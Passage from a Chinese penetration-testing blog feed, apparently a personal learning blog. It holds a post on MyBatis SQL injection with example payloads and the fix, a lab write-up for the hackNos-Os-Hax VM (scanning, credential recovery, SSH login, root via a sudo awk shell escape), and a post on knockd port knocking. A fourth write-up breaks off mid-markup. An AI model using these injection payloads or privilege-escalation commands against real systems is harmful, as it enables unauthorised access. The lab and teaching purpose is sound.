    <content type="html"><![CDATA[<h1 id="MyBatis产生sql注入的原因"><a href="#MyBatis产生sql注入的原因" class="headerlink" title="MyBatis产生sql注入的原因"></a>MyBatis产生sql注入的原因</h1><p>编写 xml 文件时，MyBatis 支持两种参数符号，<code>#&#123;&#125;</code> 和 <code>$&#123;&#125;</code></p><ul><li><code>#&#123;&#125;</code> 使用预编译，通过 PreparedStatement 和占位符来实现，会把参数部分用一个占位符 <code>?</code> 替代，而后注入的参数将不会再进行 SQL 编译，而是当作字符串处理。<strong>可以有效避免 SQL 注入漏洞</strong>。</li><li><code>$&#123;&#125;</code> 表示使用拼接字符串，将接受到参数的内容不加任何修饰符拼接在 SQL 中。<strong>易导致 SQL 注入漏洞。</strong></li></ul><p>两者的区别如下：</p><ol><li><code>#&#123;&#125;</code> 为参数占位符 <code>?</code>，即 SQL 预编译。<code>$&#123;&#125;</code> 为字符串替换，即 SQL 拼接。</li><li><code>#&#123;&#125;</code> 是“动态解析-&gt;预编译-&gt;执行”的过程。<code>$&#123;&#125;</code> 是“动态解析-&gt;编译-&gt;执行”的过程。</li><li><code>#&#123;&#125;</code> 的变量替换是在 DBMS 中。<code>$&#123;&#125;</code> 的变量替换是在 DBMS 外。</li><li>变量替换后，<code>#&#123;&#125;</code> 对应的变量自动加上引号。变量替换后，<code>$&#123;&#125;</code> 对应的变量不会加上引号。</li></ol><h1 id="一、模糊查询"><a href="#一、模糊查询" class="headerlink" title="一、模糊查询"></a>一、模糊查询</h1><h2 id="1-1-漏洞利用"><a href="#1-1-漏洞利用" class="headerlink" title="1.1 漏洞利用"></a>1.1 漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from user where id like &#x27;%$&#123;id&#125;%&#x27;<br></code></pre></td></tr></table></figure><p>若mybatis底层的代码是使用如上述的SQL查询代码，则攻击者通过构造id的值能够实现sql注入</p><blockquote><p>攻击者通过提交参数值：?id&#x3D;1%’ or 1&#x3D;1#</p><p>实现SQL注入漏洞，成功查询到所有用户的数据</p></blockquote><h2 id="1-2-漏洞修复"><a href="#1-2-漏洞修复" class="headerlink" title="1.2 漏洞修复"></a>1.2 漏洞修复</h2><p>正确的模糊查询方式应当使用CONCAT函数进行通配符的连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Mysql">select * from user where id like concat(&#x27;%&#x27;,#&#123;id&#125;,&#x27;%&#x27;)<br></code></pre></td></tr></table></figure><h1 id="二、带有IN谓语的查询"><a href="#二、带有IN谓语的查询" class="headerlink" title="二、带有IN谓语的查询"></a>二、带有IN谓语的查询</h1><h2 id="2-1-漏洞利用"><a href="#2-1-漏洞利用" class="headerlink" title="2.1 漏洞利用"></a>2.1 漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from user where id in ($&#123;id&#125;)<br></code></pre></td></tr></table></figure><p>若mybatis底层的代码是使用如上述的SQL查询代码，则攻击者通过构造id的值能够实现sql注入</p><blockquote><p>攻击者通过提交参数值：?id&#x3D;’1’) or 1&#x3D;1#</p><p>实现SQL注入漏洞，成功查询到所有用户的数据</p></blockquote><h1 id="三、带有动态排序功能的查询"><a href="#三、带有动态排序功能的查询" class="headerlink" title="三、带有动态排序功能的查询"></a>三、带有动态排序功能的查询</h1><h2 id="3-1-漏洞利用"><a href="#3-1-漏洞利用" class="headerlink" title="3.1 漏洞利用"></a>3.1 漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from user order by $&#123;column&#125; limit 0,1<br></code></pre></td></tr></table></figure><p>若mybatis底层的代码是使用如上述的SQL查询代码，则攻击者通过构造id的值能够实现sql注入</p><blockquote><p>攻击者通过提交参数值：?column&#x3D;username#</p><p>实现SQL注入漏洞，成功查询到所有用户的数据</p></blockquote><p>参考链接：<a href="https://www.cnblogs.com/2ha0yuk7on/p/16880528.html">Mybatis下的SQL注入漏洞原理及防护方法 - 2ha0yuk7on - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>渗透学习</tag>
      
      <tag>漏洞基础</tag>
      
      <tag>java开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hackNos-Os-Hax打靶日记</title>
    <link href="/2024/06/29/hackNos-Os-Hax%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/06/29/hackNos-Os-Hax%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-确认目标ip地址"><a href="#1-1-确认目标ip地址" class="headerlink" title="1.1 确认目标ip地址"></a>1.1 确认目标ip地址</h2><p>通过反复开启靶机并扫描相应网段中存活的主机即可确定靶机的ip地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.2.0/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291701833.png" alt="image-20240629170120732"></p><blockquote><p>通过测试和对MAC设备的检测识别可以知道靶机的ip地址为：192.168.2.8</p></blockquote><h2 id="1-2-目标开放TCP端口"><a href="#1-2-目标开放TCP端口" class="headerlink" title="1.2 目标开放TCP端口"></a>1.2 目标开放TCP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sS -p- 192.168.2.8 -oA nmapscan/tcpports<br></code></pre></td></tr></table></figure><p>由于只是对靶机的扫描检测，所以没有对检测进行速度限制，在真实的护网环境中应该对端口扫描的速度进行限制（通过加入参数–max-rate）</p><p><code>--max-rate 10000</code>：发包的速度不会超过10000个每秒</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291703206.png" alt="image-20240629170356155"></p><h2 id="1-3-目标开放UDP端口"><a href="#1-3-目标开放UDP端口" class="headerlink" title="1.3 目标开放UDP端口"></a>1.3 目标开放UDP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.2.8 -oA nmapscan/udpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291710541.png" alt="image-20240629171045498"></p><h2 id="1-4-开放TCP端口详细信息"><a href="#1-4-开放TCP端口详细信息" class="headerlink" title="1.4 开放TCP端口详细信息"></a>1.4 开放TCP端口详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT -sV -sC -O -p22,80 192.168.2.8 -oA nmapscan/tcpDetails<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291711538.png" alt="image-20240629171102499"></p><blockquote><p>可以确定的信息就是Web服务器是Apache，操作系统是Linux3.2-4.9之间，其他就没有什么非常有用的信息啦；</p></blockquote><h2 id="1-5-nmap漏洞扫描"><a href="#1-5-nmap漏洞扫描" class="headerlink" title="1.5 nmap漏洞扫描"></a>1.5 nmap漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -script=vuln -p22,80 192.168.2.8 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291725267.png" alt="image-20240629172550205"></p><blockquote><p>首先是可能存在DOS攻击的问题，即使存在这类攻击也不意味着什么，一般用不上DOS；</p><p>第二，可能存在SQL注入，这个就比较有用啦，但是它所给出的可能存在sql注入的url地址似乎不太可能存在sql注入，后面可以进一步尝试，说不定确实存在</p><p>第三，扫到了一些目录，其中就包括wordpress，这个框架的问题还是比较多的，这里入手比较好</p></blockquote><h1 id="2-信息检索"><a href="#2-信息检索" class="headerlink" title="2. 信息检索"></a>2. 信息检索</h1><h2 id="2-1-网页基本信息检索"><a href="#2-1-网页基本信息检索" class="headerlink" title="2.1 网页基本信息检索"></a>2.1 网页基本信息检索</h2><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291715777.png" alt="image-20240629171519723"></p><p>最有用的信息就只有指纹工具识别出来的信息，但是其实就我目前的知识积累一点门道都看不出来；</p><h2 id="2-2-目录爆破"><a href="#2-2-目录爆破" class="headerlink" title="2.2 目录爆破"></a>2.2 目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.2.8/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291719277.png" alt="image-20240629171931236"></p><blockquote><p>熟悉的wordpress出来了，这里就是我们上面漏扫扫出来的目录，因为漏洞的时间比较长，所以就做了一下目录扫描；</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://192.168.2.8/wordpress -e u<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291836219.png" alt="image-20240629183651152"></p><p>知道了wordpress版本信息是5.2.21，发现了一个用户<code>web</code>，但是没有发现密码，可以尝试一下密码爆破，但是还是先找找有没有其他的信息吧。</p><h2 id="2-3-图片加密"><a href="#2-3-图片加密" class="headerlink" title="2.3 图片加密"></a>2.3 图片加密</h2><p>通过目录的不断翻找，最后在<code>/img</code>中找到了一张特殊的图片</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291840531.png" alt="image-20240629184037492"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291840684.png" alt="image-20240629184054635"></p><p>通过命令将该图片下载到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.2.8/img/flaghost.png<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291841057.png" alt="image-20240629184159022"></p><p>图片的内容并不能获得什么特别的信息，通过<code>exiftool</code>工具查看一下图片的元数据信息；[exiftool的基本使用方法](#*.1 exiftool的基本使用方法)</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291844379.png" alt="image-20240629184433340"></p><p>其中在元数据中发现一些比较特别的数据的路径连接，尝试访问或者密码登录</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291850681.png" alt="image-20240629185010624"></p><p>尝试登录的时候我们发现url地址发生了变化导致请求错误，拒绝连接；所以我们通过别的方式进行登录吧，打开burpsuite；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291856165.png" alt="image-20240629185610108"></p><p>修改红色框框的请求的目标地址在对数据包进行放行即可登录；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291858863.png" alt="image-20240629185854812"></p><p>但是即使成功发送了数据包，但是也没能够成功登录似乎是因为没有正确的Cookies值导致登录失败，尝试一下别的方向；</p><p>最后发现存在字段作为目录信息</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291859688.png" alt="image-20240629185959637"></p><p>成功在flag2.txt中找到一串加密密文</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291900895.png" alt="image-20240629190023845"></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">i</span><span class="hljs-literal">+++++</span> <span class="hljs-literal">+++++</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">++</span> <span class="hljs-literal">+++++</span> <span class="hljs-literal">+++</span>&lt;<span class="hljs-title">]</span> &gt;<span class="hljs-literal">++++</span> <span class="hljs-literal">+++++</span> <span class="hljs-literal">+++++</span> <span class="hljs-literal">+++++</span> <span class="hljs-string">.</span>&lt;<span class="hljs-literal">+++</span> <span class="hljs-literal">+</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-</span> <span class="hljs-literal">---</span>&lt;<span class="hljs-title">]</span><br>&gt;<span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-literal">-</span> <span class="hljs-literal">--</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">+</span> <span class="hljs-literal">+++++</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">--</span> <span class="hljs-literal">----</span>&lt; <span class="hljs-title">]</span>&gt;<span class="hljs-literal">---</span> <span class="hljs-literal">-</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">++</span> <span class="hljs-literal">+</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">+</span> <span class="hljs-literal">++</span>&lt;<span class="hljs-title">]</span>&gt; <span class="hljs-literal">+++++</span> <span class="hljs-string">.</span>&lt;<span class="hljs-literal">+++</span> <span class="hljs-literal">++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<br><span class="hljs-literal">+++++</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">.</span><span class="hljs-literal">+</span> <span class="hljs-literal">+</span><span class="hljs-string">.</span><span class="hljs-literal">+++</span> <span class="hljs-literal">+++++</span> <span class="hljs-string">.</span><span class="hljs-literal">----</span> <span class="hljs-literal">--</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">+</span> <span class="hljs-literal">++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt; <span class="hljs-literal">+++</span>&lt;<span class="hljs-title">]</span> &gt;<span class="hljs-literal">++++</span> <span class="hljs-string">.</span>&lt;<span class="hljs-literal">+++</span> <span class="hljs-literal">++++</span><span class="hljs-title">[</span> <span class="hljs-literal">-</span>&gt;<span class="hljs-literal">---</span><br><span class="hljs-literal">----</span>&lt; <span class="hljs-title">]</span>&gt;<span class="hljs-literal">-</span><span class="hljs-string">.</span>&lt; <span class="hljs-literal">+++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span> &gt;<span class="hljs-literal">---</span>&lt; <span class="hljs-title">]</span>&gt;<span class="hljs-literal">---</span> <span class="hljs-string">.</span><span class="hljs-literal">+</span><span class="hljs-string">.</span><span class="hljs-literal">--</span> <span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-literal">++</span> <span class="hljs-literal">+</span><span class="hljs-string">.</span>&lt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291903860.png" alt="image-20240629190309824"></p><p>另一个文件似乎没有得到什么非常有用的信息；把精力放在破解密文上吧；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291905889.png" alt="image-20240629190535838"></p><p>别说你还真别说！Chatgpt真好使，然后我们直接搜索<code>Brainfuck Online Interpreter</code>找到了一个在线编译器<a href="https://www.dcode.fr/brainfuck-language">Brainfuck Language - Online Decoder, Translator, Interpreter (dcode.fr)</a></p><p>我们上述的加密文本（应该说是代码）放置到在线编译器中进行执行，即可得到</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291909878.png" alt="image-20240629190912827"></p><blockquote><p>username: webpassword: Hacker@4514</p></blockquote><p>通过使用burpsuite工具对请求地址进行逐一修改最后确实进入了后台管理系统</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406291911635.png" alt="image-20240629191132579"></p><p>登入后台管理系统后的第一件事，先来到设置中更新网页url地址（这个是为了后面不在需要一个个修改请求url）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406292008613.png" alt="image-20240629200805539"></p><h2 id="2-4-IP-tools"><a href="#2-4-IP-tools" class="headerlink" title="2.4 IP tools"></a>2.4 IP tools</h2><p>在后台关系系统中不断翻找，又找到了一个熟悉的东西，似乎是之前在dc-6靶场中利用过的东西</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406292012929.png" alt="image-20240629201234877"></p><p>相同的方式进行利用，但是最后发现好像shell反弹不回来，不知道是不是过滤了什么奇怪的东西，其他命令都能够执行，就是shell反弹不回来；（网上看到有人可以，但我不行）</p><h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h1><p>说来也好笑，刚才想要通过命令执行反弹shell，没成功！然后突发奇想，既然有web用户的账号密码是不是可以ssh登录啊！尝试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh web@192.168.2.8<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406292102426.png" alt="image-20240629205627301"></p><p>没想到真登录上去了；看到flag3.txt，查看一下其内容</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406292102329.png" alt="image-20240629205726672"></p><p>给出了一个加密的密码，先记录下来尝试使用john破解；</p><p>此时我们查看一下有没有可以使用的命令提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406292101248.png" alt="image-20240629210140208"></p><p>ok，真有可以用来提权的命令<code>awk</code>，那么我们直接提权即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406292102338.png" alt="image-20240629210236304"></p><p>root权限也是成功拿下！最后在&#x2F;root中也是找到了最后的flag</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406292103462.png" alt="image-20240629210342417"></p><p>下班！！！！（比爆破那个md5简单多了）</p><p>其实应该还有很多方法可以获得权限，这只是其中一种</p><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><ol><li>不要遗漏任何的信息，比如在&#x2F;img目录的图片信息等等</li><li>有些以前使用过的漏洞不能再使用了可能是由于过滤什么等等的原因，不要纠结，寻找其他方法突破</li></ol><h1 id="附录"><a href="#附录" class="headerlink" title="*. 附录"></a>*. 附录</h1><h2 id="1-exiftool的基本使用方法"><a href="#1-exiftool的基本使用方法" class="headerlink" title="*.1 exiftool的基本使用方法"></a>*.1 exiftool的基本使用方法</h2><p>ExifTool 的使用非常简单，以下是一些基本命令示例：</p><ol><li><p><strong>查看文件元数据</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool image.jpg<br></code></pre></td></tr></table></figure></li><li><p><strong>修改文件元数据</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool -Artist=<span class="hljs-string">&quot;John Doe&quot;</span> image.jpg<br></code></pre></td></tr></table></figure></li><li><p><strong>删除文件元数据</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool -all= image.jpg<br></code></pre></td></tr></table></figure></li><li><p><strong>批量处理文件</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool -Artist=<span class="hljs-string">&quot;John Doe&quot;</span> *.jpg<br></code></pre></td></tr></table></figure></li><li><p><strong>复制元数据</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool -tagsFromFile source.jpg -all:all target.jpg<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具教程</tag>
      
      <tag>web攻防</tag>
      
      <tag>打靶日记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>端口敲门knockd</title>
    <link href="/2024/06/29/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8knockd/"/>
    <url>/2024/06/29/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8knockd/</url>
    
    <content type="html"><![CDATA[<h1 id="一、什么是Port-Knocking-端口敲门"><a href="#一、什么是Port-Knocking-端口敲门" class="headerlink" title="一、什么是Port Knocking | 端口敲门"></a>一、什么是Port Knocking | 端口敲门</h1><ul><li>定义：端口敲门是一种通过在一组预先指定的关闭端口上产生连接请求，从外部打开防火墙上的端口的方法。一旦收到正确地连接请求序列，防火墙规则就会被动态修改，以允许发送连接请求的主机通过特定端口进行连接。</li><li>目的：防止攻击者通过进行端口扫描来扫描系统中潜在的可利用服务，因为除非攻击者发送正确的碰撞序列，否则受保护的端口将显示为关闭。</li></ul><h1 id="二、knockd服务配置"><a href="#二、knockd服务配置" class="headerlink" title="二、knockd服务配置"></a>二、knockd服务配置</h1><p>其中knockd服务的配置文件所在位置为<code>/etc/knockd.conf</code>，其中的初始化内容为：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bat">[options]<br>        UseSyslog<br><br>[openSSH]<br>        sequence    = <span class="hljs-number">7000</span>,<span class="hljs-number">8000</span>,<span class="hljs-number">9000</span><br>        seq_timeout = <span class="hljs-number">5</span><br>        command     = /sbin/iptables -A INPUT -s <span class="hljs-variable">%IP%</span> -p tcp --dport <span class="hljs-number">22</span> -j ACCEPT<br>        tcpflags    = syn<br><br>[closeSSH]<br>        sequence    = <span class="hljs-number">9000</span>,<span class="hljs-number">8000</span>,<span class="hljs-number">7000</span><br>        seq_timeout = <span class="hljs-number">5</span><br>        command     = /sbin/iptables -D INPUT -s <span class="hljs-variable">%IP%</span> -p tcp --dport <span class="hljs-number">22</span> -j ACCEPT<br>        tcpflags    = syn<br><br>[openHTTPS]<br>        sequence    = <span class="hljs-number">12345</span>,<span class="hljs-number">54321</span>,<span class="hljs-number">24680</span>,<span class="hljs-number">13579</span><br>        seq_timeout = <span class="hljs-number">5</span><br>        command     = /usr/local/sbin/knock_add -i -c INPUT -p tcp -d <span class="hljs-number">443</span> -f <span class="hljs-variable">%IP%</span><br>        tcpflags    = syn<br></code></pre></td></tr></table></figure><p>配置文件里有两个参数:</p><ul><li><p>sequence：按照顺序依次访问端口，command执行的条件。比如这里是依次访问7000, 8000, 9000端口，默认使用TCP访问。</p></li><li><p>command：当knockd监测到sequence端口访问完成，然后执行此处command，这里为通过iptables开启关闭ssh外部访问。</p></li></ul><h1 id="三、启动和关闭knockd"><a href="#三、启动和关闭knockd" class="headerlink" title="三、启动和关闭knockd"></a>三、启动和关闭knockd</h1><h2 id="3-1-手动构造"><a href="#3-1-手动构造" class="headerlink" title="3.1 手动构造"></a>3.1 手动构造</h2><p>通过使用telnel工具依次对端口产生链接请求</p><ul><li>打开SSH iptables</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet &lt;target IP&gt; 7000<br>telnet &lt;target IP&gt; 8000<br>telnet &lt;target IP&gt; 9000<br></code></pre></td></tr></table></figure><ul><li>关闭SSH iptables</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet &lt;target IP&gt; 9000<br>telnet &lt;target IP&gt; 8000<br>telnet &lt;target IP&gt; 7000<br></code></pre></td></tr></table></figure><h2 id="3-2-使用knockd工具"><a href="#3-2-使用knockd工具" class="headerlink" title="3.2 使用knockd工具"></a>3.2 使用knockd工具</h2><p>knockd程序自带的打开和关闭的方式</p><ul><li>打开SSH iptables</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">knock &lt;target IP&gt;  7000 8000 9000<br></code></pre></td></tr></table></figure><ul><li>关闭SSH iptables</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">knock &lt;target IP&gt;  9000 8000 7000<br></code></pre></td></tr></table></figure><h2 id="3-3-使用NC指令"><a href="#3-3-使用NC指令" class="headerlink" title="3.3 使用NC指令"></a>3.3 使用NC指令</h2><p>NC工具可以实现请求连接指定端口的效果，故也可以用来打开knockd，且时比较好的一种方式</p><ul><li>打开SSH iptables</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -z &lt;target IP&gt; 7000 8000 9000<br></code></pre></td></tr></table></figure><ul><li>关闭SSH iptables</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -z &lt;target IP&gt; 9000 8000 7000<br></code></pre></td></tr></table></figure><h2 id="3-4-Nmap工具"><a href="#3-4-Nmap工具" class="headerlink" title="3.4 Nmap工具"></a>3.4 Nmap工具</h2><ul><li>打开SSH iptables</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> 7000 8000 9000; <span class="hljs-keyword">do</span> nmap -Pn --host_timeout 201 --max-retries 0 -p <span class="hljs-variable">$x</span> &lt;target IP&gt;; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><ul><li>关闭SSH iptables</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> 9000 8000 7000; <span class="hljs-keyword">do</span> nmap -Pn --host_timeout 201 --max-retries 0 -p <span class="hljs-variable">$x</span> &lt;target IP&gt;; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>参考连接：<a href="https://blog.csdn.net/weixin_48539059/article/details/130833674">DC-9靶机-简单谈一下端口敲门技术 (Port Knocking)</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux机制</tag>
      
      <tag>端口保护</tag>
      
      <tag>Web攻防</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dc-9打靶日记</title>
    <link href="/2024/06/28/dc-9%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/06/28/dc-9%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-确认目标ip地址"><a href="#1-1-确认目标ip地址" class="headerlink" title="1.1 确认目标ip地址"></a>1.1 确认目标ip地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.48.0/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230729658.png" alt="image-20240623072943576"></p><blockquote><p>确定目标靶机ip：192.168.48.129</p></blockquote><h2 id="1-2-目标开放TCP端口"><a href="#1-2-目标开放TCP端口" class="headerlink" title="1.2 目标开放TCP端口"></a>1.2 目标开放TCP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sS --min-rate 10000 -p- 192.168.48.129 -oA nmapscan/tcpports<br></code></pre></td></tr></table></figure><p><img 